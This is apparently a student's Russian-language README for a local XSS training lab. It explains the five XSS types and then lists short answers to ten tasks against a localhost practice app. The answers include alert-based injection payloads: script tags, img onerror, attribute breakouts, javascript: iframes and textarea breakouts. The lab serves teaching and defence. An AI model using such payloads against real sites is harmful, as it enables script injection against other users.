# XSS-module
Stored, Reflected, DOM-Based, Self, Blind XSS

# 🔐 XSS — Межсайтовый скриптинг

**XSS (Cross-Site Scripting)** — уязвимость веб-приложений, позволяющая внедрять и выполнять JavaScript-код в браузере пользователя.

## 1. Stored XSS (Сохранённая)

Код сохраняется на сервере (обычно в базе данных) и выполняется при открытии страницы другими пользователями.

**Примеры:** комментарии, чаты, профили.

## 2. Reflected XSS (Отражённая)

Сервер возвращает пользовательский ввод в HTTP-ответе без безопасной обработки.

**Примеры:** поисковые строки, URL-параметры, формы.

## 3. DOM-Based XSS

Уязвимость возникает в браузере из-за небезопасной обработки данных JavaScript-кодом.

## 4. Self-XSS

Пользователя обманом заставляют самостоятельно вставить и выполнить чужой JavaScript-код в консоли браузера.

## 5. Blind XSS (Слепая)

Внедрённый код выполняется в другом интерфейсе, например в панели администратора. Отправитель не видит результат выполнения сразу.

## 📊 Сравнение

| Вид | Особенность |
|---|---|
| Stored | Код сохраняется |
| Reflected | Код возвращается сервером |
| DOM-Based | Выполнение происходит через DOM |
| Self-XSS | Пользователь запускает код сам |
| Blind | Выполнение происходит в другом интерфейсе |


## 🎯 Цель лабораторной

- Изучение видов XSS.
- Поиск XSS-уязвимостей.
- Анализ HTTP-запросов.
- Практика обнаружения уязвимостей.
- Изучение методов защиты.

# LAB1

Stored: HTML-тело, атрибут title, разные поля формы
Reflected: текст, href, value input
DOM: hash (#city=), document.write, live preview без сервера

Задания (кратко)

1. Визитка — stored, HTML-тело
2. Метка товара — reflected в абзаце
3. Контакты — stored, атрибут title
4. Ссылка-приглашение — reflected in href
5. Город доставки — DOM + hash
6–10. Доска, промокод, команда, статус заказа, живой превью   

## TASK1
```
<script>alert('p1-1')</script> or <script>alert(1)</script>
```
1) post metod, http://localhost:3847/practice/1/1, bio
2) STORED XSS

## TASK 2

1) ?tag=, <p class="tag-line">Тег на складе: <strong><script>alert(1)</script></strong></p>
2) reflected xss, да пропадет.

## TASK 3
```
"><img src="x" onerror="prompt(1)">
```
1) and title
2) stored xss, имя только

## TASK 4
```
<img src=x onerror="alert(1)">
```
1) link, nothing
2) reflected xss, да нужен

## TASK 5

1) #city=New%20York,  нет не уходит
2) нету, dom xss

## TASK 6
```
<iframe src=javascript:alert(1)>
<img src=x onerror=alert(1)>
```
1) только в тексте 
2) stored xss, только в тексте нужен payload

## TASK 7

" autofocus onfocus=alert(1) x="
1) get, проверка промокода
2) reflected, да есть, payload не выполнится

## TASK 8

'); alert(1); //')
Stored xss
2) no

## TASK 9

```
 </textarea> <img src=x onerror=alert(1)>
```
1) ?code, no
2) dom xss, ПРИ TAG НЕТУ, ПРИ CОDE ЕСТЬ

## TASK 10

```</div><div> fkbcjbj </div>
<img src=x onerror=alert(1)>
```
1) no
2) нету запроса на сервер







